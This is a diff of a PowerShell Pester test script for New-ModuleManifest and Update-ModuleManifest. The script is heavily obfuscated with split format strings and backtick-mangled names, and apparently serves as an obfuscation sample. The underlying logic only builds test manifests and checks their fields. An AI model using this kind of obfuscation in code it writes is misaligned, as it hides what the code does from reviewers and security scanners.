+                             -FileName (&(("{5}{3}{8}{6}{7}{9}{0}{2}{10}{1}{4}" -f 'ageme','it-Pa','ntgKaSp','ic','th','M','t.PowerSh','ell.','rosof','Man','l')).("{1}{0}" -f 'ace','rEPL').Invoke('gKa','\') ${scriPt:Test`MAnI`F`eStp`Ath} -Leaf) `
+                             -BaseDirectory (&((("{1}{7}{5}{6}{3}{2}{4}{0}" -f't-Path','Microso','n','anageme','t{0}Spli','t.PowerShell.','M','f'))  -F  [char]92) ${SCRipt:TE`StM`A`N`IfES`T`pAth} -Parent) `
+                             -ErrorAction ("{1}{4}{2}{0}{3}"-f 'lyC','Sil','nt','ontinue','e') `
+                             -WarningAction ("{4}{0}{2}{3}{1}"-f'lentlyC','nue','on','ti','Si')
+
+        &("{2}{1}{0}"-f'quals','ertE','Ass') ${M`OD`U`l`eM`AnI`FeSthAsHtable}."d`efaultC`oMMa`NdPREf`Ix" ${De`FAUltCOmMA`N`DpREfIx} "DefaultCommandPrefix should be $($DefaultCommandPrefix) "
+        &("{1}{0}{2}"-f'rtE','Asse','quals') ${M`oDu`LeM`Anif`eST`H`AShtab`LE}."cM`DlEtSTo`ex`POrT"."cOu`Nt" ${cMDlE`Ts`T`O`expoRt}."coU`NT" "CmdletsToExport count should be $($CmdletsToExport.Count) "
+        for (${i} = 0; ${I} -lt ${cMD`LETS`ToeXPo`Rt}."lEnG`TH"; ${I}++) {
+            &("{0}{1}"-f'Asser','t') (${MoDule`mANi`F`EStha`SH`TabLE}."CMD`l`etsToEXpo`Rt" -contains (${Cm`DLEtSTOEx`PO`Rt}[${i}])) "CmdletsToExport should contain $($CmdletsToExport[$i]) "
+        }
+        &("{2}{1}{0}"-f'ls','sertEqua','As') ${modUlemANi`F`esTHA`s`h`T`AbLE}."fu`NctIO`NS`TOex`PorT"."CO`Unt" ${FunctIO`NST`o`ex`PorT}."cOu`Nt" "FunctionsToExport count should be $($FunctionsToExport.Count) "
+        for (${i} = 0; ${i} -lt ${F`U`NCtION`st`oEXPoRt}."LEn`gtH"; ${I}++) {
+            &("{0}{1}" -f'Ass','ert') (${MOdul`EmA`NIfeSt`h`A`shtaBLE}."FuNCtIOn`StO`EX`PORt" -contains (${FuNctiO`NstO`EXpo`RT}[${i}])) "FunctionsToExport should contain $($FunctionsToExport[$i]) "
+        }
+        &("{1}{0}{2}" -f 'ssertEqua','A','ls') ${mO`dULE`ManIFeSTH`As`hta`BLe}."alIAS`ESt`OEXpO`Rt"."c`ount" ${Al`IasEs`TOEx`porT}."cou`NT" "AliasesToExport count should be $($AliasesToExport.Count) "
+        for (${i} = 0; ${I} -lt ${ALIA`SesTo`ex`pO`RT}."Leng`Th"; ${I}++) {
+            &("{1}{0}"-f 'rt','Asse') (${M`ODuLe`m`A`NifE`SThASHTA`BLE}."AL`IASe`ST`oexPoRT" -contains (${aLiasE`sT`o`exPo`RT}[${i}])) "AliasesToExport should contain $($AliasesToExport[$i]) "
+        }
+    }
+
+    
+    
+    
+    
+    
+    
+    &('It') ("{9}{0}{6}{1}{8}{2}{10}{3}{7}{4}{5}" -f'eMo','uleManifes','thEmp','uncti','ets','ToExport','d','onsAndCmdl','tWi','Updat','tyF') {
+        &("{5}{2}{0}{3}{4}{1}" -f 'eM','t','Modul','an','ifes','New-')  -Path ${S`CrIpt:t`Es`T`mA`NI`FeStP`AtH} -Confirm:${f`AL`se} -CmdletsToExport ("{2}{0}{1}" -f'nd','let1','comma'),("{1}{0}{2}"-f 'mmand','co','let2') `
+                            -FunctionsToExport ("{3}{1}{0}{2}"-f'o','uncti','n1','f'),("{0}{1}{2}" -f 'f','unction','2') -AliasesToExport ("{1}{0}"-f'as1','ali'),("{0}{1}"-f 'ali','as2')
+        &("{4}{1}{0}{2}{3}"-f'oduleMan','M','ife','st','Update-') -Path ${SCr`IPt`:T`estM`ANi`FEStpATH} -CmdletsToExport "" -FunctionsToExport "" -AliasesToExport ""
+        ${UpdAT`eD`mO`dULe`InFO} = &("{4}{3}{6}{5}{1}{0}{2}" -f'f','duleMani','est','es','T','o','t-M') -Path ${S`CriPT:tEstmA`Ni`FestPA`TH}
+
+        &("{0}{2}{1}" -f 'A','tEquals','sser') ${U`p`dAtED`moDUle`IN`Fo}."functIOnSTo`E`xpO`RT"."CO`UnT" 0 ("{4}{3}{0}{7}{8}{6}{2}{1}{5}"-f't','oul','nt sh','c','Fun','d be 0','ou','ionsToExport ','c')
+        &("{1}{0}{3}{2}" -f 'ss','A','uals','ertEq') ${UP`d`ATedModuL`E`InFo}."cMdLets`T`OE`X`pOrt"."C`oUnt" 0 ("{2}{3}{0}{4}{5}{1}"-f'ou','should be 0','CmdletsToExport ','c','n','t ')
+        &("{1}{0}{3}{2}" -f 'rtEqua','Asse','s','l') ${uP`DaTEDmo`DU`Le`in`Fo}."alIaSeSt`o`ex`pOrt"."CoU`NT" 0 ("{0}{3}{6}{5}{4}{2}{1}" -f 'Al',' be 0','ould','iasesTo','unt sh','rt co','Expo')
+    }
+
+    
+    
+    
+    
+    
+    
+    &('It') ("{0}{8}{3}{5}{6}{4}{7}{2}{1}" -f'U','lds','ie','dateM','uleManifestWi','o','d','thSameF','p') {
+
+        ${s`cR`i`ptsTOPr`OCESsfiL`E`p`ATh} = "$script:UpdateModuleManifestBase\$script:UpdateModuleManifestName.ps1"
+        &("{1}{2}{0}" -f 'ontent','Se','t-C') ${S`cri`P`TStO`pRo`Ce`sSfiL`EPATH} -Value "function Get-$script:UpdateModuleManifestName { Get-Date }"
+
+        &("{0}{2}{1}" -f 'S','ent','et-Cont') "$script:UpdateModuleManifestBase\$script:UpdateModuleManifestName.psm1" -Value "function Get-$script:UpdateModuleManifestName { Get-Date }"
+        
+        ${Gu`ID} =   ${j0DE`mn}::("{0}{2}{1}" -f'Ne','uid','wg').Invoke().("{0}{1}" -f 'ToStri','ng').Invoke()
+        ${Ve`RS`IoN} = "2.0"
+        ${DEScrI`p`Tion} = ("$script:UpdateModuleManifestName "+'modul'+'e')
+        ${pRoC`eSsorArCHIte`c`T`UrE} = ${ENV`:prOCE`ssor_A`R`CHITECtUre}
+        ${R`E`LEaSe`NOtES} = ("$script:UpdateModuleManifestName "+'r'+'el'+'ease '+'note'+'s')
+        ${ta`Gs} = ("{1}{0}" -f'et','PSG'),"DSC"
+        ${PR`OJEc`TurI} = "https://$script:UpdateModuleManifestName.com/Project"
+        ${ICo`NuRI} = "https://$script:UpdateModuleManifestName.com/Icon"
+        ${l`iceNSEU`RI} = "https://$script:UpdateModuleManifestName.com/license"
+        ${a`UThor} = ("{1}{2}{0}" -f'Name','Autho','r')
+        ${COM`P`ANYna`Me} = ("{2}{1}{0}{3}" -f'Nam','ompany','C','e')
+        ${c`oP`yRiGhT} = ("{1}{2}{0}" -f 't','CopyR','igh')
+        ${R`OO`TMOdUle} = "$script:UpdateModuleManifestName.psm1"
+        ${PowE`RsH`Ell`VeRs`ION} = "3.0"
+        ${clrv`eRs`I`on} = "2.0"
+        ${DoTN`etfr`AMeWoRK`VE`R`Si`on} = "2.0"
+        ${pO`WE`RsHEllhO`sTveR`SIoN} = "0.1"
+        ${tYp`Es`TOPR`oc`eSS} = ("{1}{0}"-f 'es','typ'),("{1}{0}"-f'wo','typesT')
+        ${FormaTs`To`PoR`c`ess} = ("{1}{0}{2}" -f'rmat','fo','s'),("{2}{1}{0}" -f 'o','ormatsTw','f')
+        ${R`eq`UI`ReDaS`sEmbLiEs} = ("{4}{1}{0}{2}{3}"-f'o','.management.aut','matio','n','system')
+        ${mO`d`ULElI`St} = ("{6}{1}{3}{4}{5}{7}{0}{2}"-f'age','rosoft','ment','.Po','werS','he','Mic','ll.Man'), 
+               ("{1}{3}{2}{4}{0}"-f'tility','Microsoft.P','werShel','o','l.U')
+        ${fU`Nc`T`iOnStOexpOrt} = ("{0}{1}" -f'function','1'),("{2}{3}{1}{0}" -f'on2','ncti','f','u')
+        ${A`LiAS`E`STOExPORT} = ("{0}{1}"-f 'alia','s1'),("{1}{0}"-f'2','alias')
+        ${var`iABLe`STo`Ex`pOrT} = ("{1}{0}"-f'1','var'),("{1}{0}"-f 'r2','va')
+        ${cmDLeT`s`To`ExPoRT}=("{0}{2}{1}" -f'g','est1','et-t'),("{1}{2}{0}"-f'2','get-te','st')
+        ${H`ELPinFou`RI} = "https://$script:UpdateModuleManifestName.com/HelpInfoURI"
+        ${ReqUIR`e`dmo`DuleS} = @(("{3}{2}{0}{5}{1}{4}{6}" -f'ower','h','rosoft.P','Mic','ell','S','.Management'),@{("{1}{0}{2}" -f 'leN','Modu','ame')=("{3}{4}{2}{0}{1}"-f 'he','ll.Utility','oft.PowerS','M','icros');("{2}{3}{0}{1}" -f 'Versi','on','Modu','le')=("{1}{0}" -f'0','1.0.0.');("{1}{0}" -f'UID','G')=("{1}{6}{5}{2}{3}{4}{0}" -f'3d59','1','52b-403e-9','8dc','-74d7b4d6','e53-1','da87')})
+        ${NEsTed`m`oDuL`es} = ("{5}{1}{9}{8}{6}{2}{0}{7}{4}{3}"-f'a','croso','hell.M','ment','e','Mi','werS','nag','Po','ft.'),("{5}{1}{4}{3}{0}{2}"-f'ti','.Power','lity','ll.U','She','Microsoft')
+        ${SCR`I`ptsTo`p`RO`cESs} = "$script:UpdateModuleManifestName.ps1"
+        ${pAr`A`m`sV3} = @{}
+        ${pAr`AM`sv3}.("{1}{0}" -f 'dd','A').Invoke(("{1}{0}" -f 'uid','G'),${gu`id})
+        ${pA`R`Ams`V3}.("{0}{1}" -f'Ad','d').Invoke(("{1}{0}"-f 'thor','Au'),${auT`hoR})
+        ${p`ArAmsv3}.("{1}{0}"-f 'dd','A').Invoke(("{0}{1}{3}{2}"-f 'Co','mpa','me','nyNa'),${cOMP`An`ynaMe})
+        ${PAr`AmS`V3}.("{1}{0}" -f'dd','A').Invoke(("{1}{2}{0}" -f't','Cop','yRigh'),${C`opyr`iG`HT})
+        ${PARA`m`sV3}.("{0}{1}" -f 'Ad','d').Invoke(("{0}{3}{1}{2}" -f'Root','d','ule','Mo'),${rooT`MODu`le})
+        ${pa`Ra`mS`V3}.("{1}{0}" -f 'dd','A').Invoke(("{0}{1}{3}{2}" -f'M','odul','on','eVersi'),${VeR`sI`on})
+        ${PArA`M`Sv3}.("{1}{0}"-f'd','Ad').Invoke(("{2}{1}{0}" -f 'ion','ript','Desc'),${DE`SCrip`TIon})
+        ${PaR`AMs`V3}.("{0}{1}" -f 'Ad','d').Invoke(("{4}{0}{3}{5}{2}{1}" -f 'ssorAr','ure','t','chit','Proce','ec'),${Pr`OcesSoR`ArChit`e`Ct`U`RE})
+        ${p`ARa`msV3}.("{1}{0}"-f 'dd','A').Invoke(("{2}{1}{3}{0}{4}"-f 'll','r','Powe','She','Version'),${poW`ER`sHE`llVE`R`siOn})
+        ${p`Ar`AMSV3}.("{0}{1}"-f'A','dd').Invoke(("{1}{0}{2}"-f 'ersi','ClrV','on'),${cl`RV`ERSIOn})
+        ${Pa`Ram`SV3}.("{0}{1}" -f'Ad','d').Invoke(("{0}{1}{5}{3}{2}{4}"-f'DotNet','Fram','sio','er','n','eworkV'),${dOTNeTfRaMEw`ORk`V`Ers`ioN})
+        ${p`ArAMsv3}.("{0}{1}" -f 'Ad','d').Invoke(("{3}{6}{4}{0}{5}{1}{2}" -f'ostV','rsio','n','P','ellH','e','owerSh'),${p`OwERs`HeLLH`osTvErs`Ion})
+        ${P`A`RaMsv3}.("{1}{0}"-f'dd','A').Invoke(("{2}{4}{0}{3}{1}" -f'red','dules','Re','Mo','qui'),${r`EQ`UIr`Edmodu`LEs})
+        ${PAra`MsV3}.("{0}{1}" -f 'A','dd').Invoke(("{4}{0}{1}{2}{3}" -f'e','qui','redA','ssemblies','R'),${rEQu`ireD`AS`sEm`BL`ies})
+        ${pA`RAm`SV3}.("{0}{1}" -f 'Ad','d').Invoke(("{3}{2}{0}{4}{1}"-f'Modul','s','ested','N','e'),${NesTE`dM`O`du`leS})
+        ${Pa`R`A`MSv3}.("{0}{1}"-f 'A','dd').Invoke(("{3}{2}{1}{0}" -f 'ist','leL','u','Mod'),${Mo`du`lElisT})
+        ${p`ArA`M`sv3}.("{1}{0}"-f'd','Ad').Invoke(("{3}{2}{4}{0}{1}"-f 'ToEx','port','tio','Func','ns'),${fUnc`TIoN`sTOE`XpOrT})
+        ${pAr`AmS`V3}.("{0}{1}" -f 'Ad','d').Invoke(("{2}{1}{4}{0}{3}" -f'Expor','lias','A','t','esTo'),${AlIASES`TOe`XPo`RT})
+        ${PaR`Ams`V3}.("{1}{0}"-f'd','Ad').Invoke(("{3}{0}{2}{4}{1}"-f 'a','ort','bl','Vari','esToExp'),${va`RIab`LEs`ToeXp`o`RT})
+        ${pArAm`s`V3}.("{1}{0}"-f 'dd','A').Invoke(("{1}{3}{2}{0}"-f'port','Cmdle','x','tsToE'),${C`MDLEtstO`EX`po`RT})
+        ${PaR`Am`sV3}.("{1}{0}" -f'dd','A').Invoke(("{0}{3}{2}{1}"-f'He','I','UR','lpInfo'),${He`L`pinfoU`RI})
+        ${parA`MS`V3}.("{1}{0}" -f'd','Ad').Invoke(("{1}{0}" -f 'ath','P'),${SCR`iP`T`:tesTmANiFE`sT`PATh})
+        ${pAraM`S`V3}.("{1}{0}"-f'dd','A').Invoke(("{2}{3}{0}{1}" -f'Pro','cess','ScriptsT','o'),${sCrI`pTS`ToProC`eSs})
+
+        ${p`A`RaMsV5}= ${P`ARAms`V3}.("{1}{0}"-f 'e','Clon').Invoke()
+        ${paRAm`sv5}.("{1}{0}"-f 'd','Ad').Invoke(("{0}{1}"-f 'Ta','gs'),${t`Ags})
+        ${par`AMs`V5}.("{0}{1}" -f'A','dd').Invoke(("{2}{1}{3}{0}" -f'i','c','Proje','tUr'),${Pr`Oj`E`CTUrI})
+        ${p`Ar`Amsv5}.("{0}{1}" -f'A','dd').Invoke(("{2}{0}{1}" -f'se','Uri','Licen'),${l`icEnS`eu`Ri})
+        ${P`ARaMsv5}.("{0}{1}" -f 'Ad','d').Invoke(("{0}{1}"-f'I','conUri'),${iC`onuRI})
+        ${parAm`S`V5}.("{1}{0}"-f'd','Ad').Invoke(("{2}{1}{3}{0}"-f'Notes','lea','Re','se'),${RElEA`sEN`OteS})
+
+
+        if(${PS`VE`RSiO`NTa`Ble}."Ps`VERS`i`oN" -ge ("{1}{0}"-f'0','3.0.') -and ${PsVER`si`oNta`B`le}."Ve`RS`ioN" -le ("{1}{0}"-f '.0','4.0'))
+        {
+            &("{5}{2}{3}{1}{4}{0}" -f 't','an','w-Modul','eM','ifes','Ne')  @ParamsV3 -Confirm:${FAl`Se} 
+            &("{0}{2}{3}{1}" -f 'Update-ModuleM','st','a','nife') @ParamsV3 -Confirm:${FAL`se}
+        }
+        elseif(${PSveRsioNt`A`BlE}."Ps`VE`RSION" -ge ("{1}{0}" -f '0','5.0.'))
+        {
+            &("{0}{2}{1}{3}"-f 'N','Manife','ew-Module','st')  @ParamsV5 -Confirm:${fa`lsE} 
+            &("{2}{5}{1}{0}{4}{3}"-f '-ModuleMan','te','Upd','st','ife','a') @ParamsV5 -Confirm:${FA`lSE}
+        }
+
+        
+        ${nEw`moD`UlEiNfo} = &("{4}{2}{1}{3}{0}" -f 'st','l','est-Modu','eManife','T') -Path ${Sc`R`ipT:TE`ST`mA`NIFeSt`pAtH}
+
+        &("{1}{2}{0}{3}" -f 'qu','Asser','tE','als') ${n`eWmO`dU`LE`INfo}."G`UId" ${G`UId} "Guid should be $($Guid) "
+        &("{1}{0}{3}{2}"-f 'sser','A','als','tEqu') ${nE`W`MO`dULein`FO}."a`UThOr" ${au`Th`oR} "Author name should be $($Author) "
+        &("{0}{1}{2}"-f 'Ass','ertEqua','ls') ${NEWm`odule`iN`FO}."CoMP`AnyN`AME" ${co`mpAn`YNA`mE} "Company name should be $($CompanyName) "
+        &("{1}{0}{2}"-f 'q','AssertE','uals') ${nEw`MODu`L`eI`Nfo}."cOpY`Rig`hT" ${C`oPYRIg`Ht} "Copyright should be $($CopyRight) "
+        &("{0}{2}{1}" -f 'AssertE','ls','qua') ${NEw`modUleIN`Fo}."R`ootm`ODUlE" ${Ro`OT`m`oDuLe} "RootModule should be $($RootModule) "
+        &("{1}{0}{2}{3}"-f 's','A','sert','Equals') ${NeW`MO`dule`inFO}."Ve`RS`iON"."MAJ`oR" ${VErS`iON} "Module version should be $($Version) "
+        &("{0}{2}{1}" -f 'Ass','als','ertEqu') ${ne`WMO`D`UleiNFO}."d`EsCr`iPTioN" ${de`SCRI`PTiOn} "Description should be $($Description) "
+        &("{0}{1}{2}"-f 'A','ssertE','quals') ${N`E`wMOdULeInfo}."p`R`OCESSORARC`hite`ctuRe" ${P`ROC`EssoRA`RchIte`cT`UrE} "Processor architecture name should be $($ProcessorArchitecture) "
+        &("{2}{0}{1}"-f'ertEqual','s','Ass') ${N`eW`modu`leiNfo}."cL`R`VeRs`ION" ${C`LR`VErsi`ON} "ClrVersion should be $($ClrVersion) "
+        &("{0}{2}{1}" -f 'A','quals','ssertE') ${n`EwM`oDuL`eiNFo}."dOT`NEt`Fr`Ame`w`ORKVeR`sioN" ${do`TNetfRAME`W`o`RKverSIon} "Dot Net Framework version should be $($DotNetFrameworkVersion) "
+        &("{0}{2}{1}"-f 'AssertE','ls','qua') ${ne`w`mo`D`ULeiNFO}."Pow`e`R`sH`el`LhoSTvERsiON" ${p`oWERSh`ELL`hoS`T`V`ErSIOn} "PowerShell Host Version should be $($PowerShellHostVersion) "
+        &("{2}{0}{3}{1}"-f 'sse','ls','A','rtEqua') ${n`E`WMo`DUL`EINfO}."R`Equir`E`dASsEM`Bl`IeS" ${REqUIr`e`dasSEmBL`i`eS} "RequiredAssemblies should be $($RequiredAssemblies) "
+        &("{1}{0}{3}{2}" -f 'sse','A','tEquals','r') ${N`ew`mOdulEi`NFO}."POW`Ers`hELLhOS`T`VerSion" ${pOWers`he`LlhOs`TV`e`RsIoN} "PowerShell Host Version should be $($PowerShellHostVersion) "
+        &("{0}{2}{1}" -f'As','ert','s') (${neW`mOd`UL`eiNfO}."m`ODU`LE`LIst"."nA`me" -contains ${Mo`dULeL`isT}[0]) "Module List should include $($ModuleList[0]) "
+        &("{0}{1}" -f 'Asser','t') (${NewmodUl`E`i`NFO}."ExPorTEdF`Unc`TiO`NS"."K`EyS" -contains ${FUnc`Ti`Ons`T`OEX`PorT}[0]) "ExportedFunctions should include $($FunctionsToExport[0]) "
+        &("{0}{2}{1}"-f 'Asse','t','r') (${NEWMoDU`L`EIN`Fo}."e`xp`OrTED`FUNC`T`ions"."kE`yS" -contains ${fuNctIoN`S`TOe`x`PorT}[1]) "ExportedFunctions should include $($FunctionsToExport[1]) "
+        &("{1}{0}"-f'ssert','A') (${N`eWmOdU`lEIn`Fo}."e`xP`ORTedalI`As`eS"."kE`Ys" -contains ${aL`iaSe`sToE`xpo`Rt}[0]) "ExportedAliases should include $($AliasesToExport[0]) "
+        &("{1}{0}{2}"-f 'sser','A','t') (${Ne`wMo`DuLEInFo}."ex`P`o`RT`eDAliaSes"."KE`yS" -contains ${aLI`As`ESTOEx`po`Rt}[1]) "ExportedAliases should include $($AliasesToExport[1]) "
+        &("{1}{0}{2}"-f 'ss','A','ert') (${neWm`odul`eI`N`Fo}."e`XPO`RTEDVArIA`B`l`Es"."ke`YS" -contains ${vaR`I`ABlest`oe`xp`Ort}[0]) "ExportedVariables should include $($VariablesToExport[0]) "
+        &("{0}{1}"-f'Asser','t') (${nE`W`modULeIN`FO}."E`xporTeD`VAr`iaBles"."kE`Ys" -contains ${vAR`IaBLES`To`e`xpORT}[1]) "ExportedVariables should include $($VariablesToExport[1]) "
+        &("{1}{0}{2}" -f 'se','As','rt') (${N`EWmo`D`ULeI`NfO}."E`xpOr`Te`DCMDLetS"."kE`YS" -contains (${c`Md`LetStO`exP`oRT}[0])) "CmdletsToExport should contain $($CmdletsToExport[0]) "
+        &("{1}{0}" -f't','Asser') (${n`Ew`Mod`U`LeInfo}."EXP`O`RTEDCmdL`Ets"."k`eys" -contains (${Cm`Dl`E`TSTOeXpO`RT}[1])) "CmdletsToExport should contain $($CmdletsToExport[1]) "
+        if(${pSV`ERs`i`ONT`Able}."v`ErS`ION" -gt ("{0}{1}"-f '5.0.','0'))
+        {
+            &("{2}{1}{0}"-f't','sser','A') (${n`e`WmOD`Ul`eINfO}."t`AGS" -contains ${TA`gs}[0]) "Tags should include $($Tags[0]) "
+            &("{0}{1}"-f 'Asser','t') (${N`eWm`OdUL`ei`NFo}."tA`Gs" -contains ${Ta`gS}[1]) "Tags should include $($Tags[1]) "
+            &("{0}{3}{1}{2}" -f 'Ass','ual','s','ertEq') ${NE`wM`OduL`eI`NFo}."PrO`Je`ctuRI" ${Pr`Oj`e`ctUrI} "ProjectUri should be $($ProjectUri) "
+            &("{2}{0}{3}{1}" -f 'sert','ls','As','Equa') ${NEw`mOd`Ule`iN`Fo}."l`Ic`ENsE`Uri" ${l`ICeNseU`Ri} "LicenseUri should be $($LicenseUri) "
+            &("{3}{2}{0}{1}" -f'sertEqual','s','s','A') ${nEWMO`D`Ul`e`InFo}."i`COnu`Ri" ${Ico`NuRI} "IconUri should be $($IconUri) "
+            &("{1}{0}{2}"-f'tEqu','Asser','als') ${neWM`Odu`le`I`NfO}."r`EleaS`enoT`es" ${r`ELE`AsENo`TEs} "ReleaseNotes should be $($ReleaseNotes) "
+        }
+      
+        &("{0}{1}{2}"-f'As','s','ert') (${nEwmoD`UlE`in`Fo}."scRi`PtS" -contains ${s`CRipt`STOPRoCEss`FiL`EP`A`TH}) "ScriptsToProcess should include $($ScriptsToProcess) "
+        ${n`e`WModUleInFO}."H`E`LPInfO`URI" | &("{1}{0}" -f 'd','Shoul') ('Be') ${HeLpI`Nfo`URi}
+    } `
+    -Skip:$(${I`SwiN`do`WS} -eq ${F`AlsE})
+
+    
+    
+    
+    
+    
+    
+    &('It') ("{1}{5}{0}{4}{2}{3}"-f 'eManifestWith','UpdateM','Field','s','All','odul') {
+
+        &("{3}{2}{0}{1}"-f 't-','Content','e','S') "$script:UpdateModuleManifestBase\$script:UpdateModuleManifestName.psm1" -Value "function Get-$script:UpdateModuleManifestName { Get-Date }"
+        ${g`UID} =    ${j0`De`mn}::("{1}{0}" -f'wguid','Ne').Invoke().("{2}{0}{1}" -f 'S','tring','To').Invoke()
+        ${ve`RsiON} = "2.0"
+        ${dEscrIP`TI`ON} = ("$script:UpdateModuleManifestName "+'mo'+'d'+'ule')
+        ${P`R`OcE`SSo`RArcHit`eCt`URe} = ${EN`V:prOceS`s`OR_`ArchitE`CT`UrE}
+        ${reL`ea`s`EnOtES} = ("$script:UpdateModuleManifestName "+'r'+'elease'+' '+'not'+'es')
+        ${ta`gS} = ("{1}{0}" -f'SGet','P'),"DSC"
+        ${PR`o`JeCt`URI} = "https://$script:UpdateModuleManifestName.com/Project"
+        ${i`conURi} = "https://$script:UpdateModuleManifestName.com/Icon"
+        ${lice`NSEu`RI} = "https://$script:UpdateModuleManifestName.com/license"
+        ${a`Uth`or} = ("{1}{0}{2}" -f 'ho','Aut','rName')
+        ${C`OMpAnY`N`Ame} = ("{2}{3}{1}{0}" -f 'Name','ny','Co','mpa')
+        ${c`opYri`Ght} = ("{1}{0}{2}" -f'yR','Cop','ight')
+        ${R`ooT`MOdU`Le} = "$script:UpdateModuleManifestName.psm1"
+        ${pOw`ErsheLL`Ver`S`I`On} = "3.0"
+        ${c`L`RVersiON} = "2.0"
+        ${dotNEtF`R`Am`e`WO`RKve`RsiON} = "2.0"
+        ${po`we`RSHel`lhostveR`sIon} = "0.1"
+        ${T`YP`EstO`Pr`Ocess} = ("{1}{0}" -f'ypes','t'),("{1}{2}{0}" -f'wo','type','sT')
+        ${fo`Rm`AtstO`porcesS} = ("{1}{0}" -f 'ormats','f'),("{1}{2}{0}" -f 'Two','forma','ts')
+        ${rEq`Uire`DaS`Sem`BLi`es} = ("{4}{2}{3}{0}{5}{1}"-f'nagem','t.automation','tem','.ma','sys','en')
+        ${M`oDuLEL`I`sT} = ("{4}{1}{6}{7}{3}{0}{5}{2}"-f'g','icrosoft.PowerS','t','na','M','emen','hel','l.Ma'), 
+               ("{1}{0}{3}{2}{6}{5}{4}"-f'ic','M','.','rosoft','y','Shell.Utilit','Power')
+        ${FUNc`TI`Onstoex`P`Ort} = ("{2}{0}{1}"-f 'n','1','functio'),("{1}{0}"-f '2','function')
+        ${a`lias`E`stoEx`port} = ("{1}{0}" -f 's1','alia'),("{0}{1}"-f 'alias','2')
+        ${VaRi`Abl`esT`o`Exp`ORT} = ("{1}{0}" -f 'r1','va'),("{1}{0}"-f 'r2','va')
+        ${c`mDletS`T`Oe`x`PoRt}=("{1}{2}{0}"-f'est1','get','-t'),("{2}{0}{1}" -f'et','-test2','g')
+        ${HE`Lp`I`NFOUrI} = "https://$script:UpdateModuleManifestName.com/HelpInfoURI"
+        ${RE`Q`U`iReDmoDuLeS} = @(("{3}{5}{2}{4}{0}{1}" -f 'soft.PowerShell.M','anagement','r','M','o','ic'),@{("{2}{0}{1}"-f'ul','eName','Mod')=("{4}{7}{8}{0}{3}{2}{6}{1}{5}"-f't.Po','hell.Util','er','w','M','ity','S','icr','osof');("{2}{3}{0}{1}"-f'rsi','on','Modu','leVe')=("{0}{1}" -f'1.0.','0.0');("{1}{0}" -f'UID','G')=("{2}{6}{9}{5}{4}{0}{7}{3}{1}{8}"-f '4','4d63','1','74d7b','152b-','7e53-','da','03e-98dc-','d59','8')})
+        ${neS`T`eDMOdul`ES} = ("{6}{2}{0}{5}{1}{3}{7}{4}"-f 'r','h','ic','el','anagement','osoft.PowerS','M','l.M'),("{3}{4}{5}{0}{2}{1}"-f'hell.Ut','ty','ili','Microso','ft.P','owerS')
+        ${eXTE`Rn`A`lm`Odu`l`Ed`epEndEncIES} = ("{7}{3}{4}{2}{1}{0}{6}{5}"-f'em','nag','.Ma','cr','osoft.PowerShell','t','en','Mi'),("{8}{4}{3}{6}{1}{2}{5}{7}{0}" -f'ty','o','we','os','icr','rSh','oft.P','ell.Utili','M')
+
+        ${P`A`RaMSv3} = @{}
+        ${PAR`AmSv3}.("{1}{0}" -f 'd','Ad').Invoke(("{1}{0}"-f 'uid','G'),${G`Uid})
+        ${p`Ar`Am`SV3}.("{0}{1}" -f'A','dd').Invoke(("{0}{1}{2}" -f 'Au','tho','r'),${A`UTh`oR})
+        ${p`Ar`AmSV3}.("{1}{0}" -f 'd','Ad').Invoke(("{0}{2}{1}" -f 'Compa','me','nyNa'),${cOMP`ANYNa`me})
+        ${PA`R`AMsv3}.("{0}{1}" -f'A','dd').Invoke(("{1}{0}{2}" -f'o','C','pyRight'),${C`Opyr`IgHt})
+        ${P`ARAM`sV3}.("{1}{0}"-f 'dd','A').Invoke(("{1}{0}{2}{3}"-f'od','RootM','ul','e'),${RoOt`Mo`DU`lE})
+        ${p`A`RaM`Sv3}.("{1}{0}" -f 'd','Ad').Invoke(("{1}{2}{0}{3}" -f'leVers','Mo','du','ion'),${ve`R`sIOn})
+        ${Para`MS`V3}.("{1}{0}" -f 'dd','A').Invoke(("{0}{3}{1}{2}" -f'Desc','ipti','on','r'),${descR`ipT`i`on})
+        ${P`A`Ra`msv3}.("{1}{0}" -f 'd','Ad').Invoke(("{2}{3}{0}{1}{4}"-f'ct','u','Pro','cessorArchite','re'),${Proc`Es`SOrAr`Ch`iTEcTURE})
+        ${PAraMS`V3}.("{1}{0}" -f 'dd','A').Invoke(("{2}{0}{4}{1}{3}" -f 'wer','hellVersi','Po','on','S'),${pOwerShEL`L`VE`RsI`on})
+        ${Param`S`V3}.("{0}{1}" -f'A','dd').Invoke(("{0}{3}{1}{2}" -f 'Clr','er','sion','V'),${CLr`V`ERS`ION})
+        ${paR`Ams`V3}.("{0}{1}" -f 'A','dd').Invoke(("{0}{2}{1}{4}{3}"-f'DotN','orkVer','etFramew','ion','s'),${Dot`NeTfRame`worKV`Er`sIOn})
+        ${pAr`Am`sv3}.("{1}{0}" -f 'dd','A').Invoke(("{3}{1}{5}{2}{0}{4}"-f'e','H','V','PowerShell','rsion','ost'),${Po`WER`shELlhO`sTvers`iON})
+        ${Pa`RaMs`V3}.("{1}{0}" -f 'd','Ad').Invoke(("{3}{2}{1}{0}"-f 'les','Modu','d','Require'),${Re`QUiR`edmOdU`Les})
+        ${PA`RA`msv3}.("{0}{1}"-f'A','dd').Invoke(("{1}{0}{2}{3}"-f 'q','Re','uiredAs','semblies'),${REquirED`AsSE`m`BLI`eS})
+        ${paRaM`s`V3}.("{1}{0}"-f'd','Ad').Invoke(("{3}{1}{4}{2}{0}"-f 'es','d','dul','Neste','Mo'),${neSTEDM`od`UlEs})
+        ${P`ARAMs`V3}.("{1}{0}"-f'd','Ad').Invoke(("{1}{2}{0}"-f'st','Modu','leLi'),${mod`ULE`lISt})
+        ${p`ArAMS`V3}.("{1}{0}" -f 'd','Ad').Invoke(("{1}{2}{0}{3}"-f'xp','Functions','ToE','ort'),${Fu`NctION`stO`eXpO`Rt})
+        ${pA`RamS`V3}.("{1}{0}"-f 'dd','A').Invoke(("{1}{3}{2}{0}{4}"-f'ToExpor','Ali','ses','a','t'),${a`LI`AsESTOexp`OrT})
+        ${pAraM`S`V3}.("{0}{1}" -f 'Ad','d').Invoke(("{1}{3}{4}{0}{2}"-f'Expo','V','rt','ari','ablesTo'),${vARI`AB`LEST`oeXpO`RT})
+        ${pa`R`AMsv3}.("{1}{0}" -f'dd','A').Invoke(("{1}{2}{0}"-f'tsToExport','Cmd','le'),${Cm`DlE`TstOE`xpo`Rt})
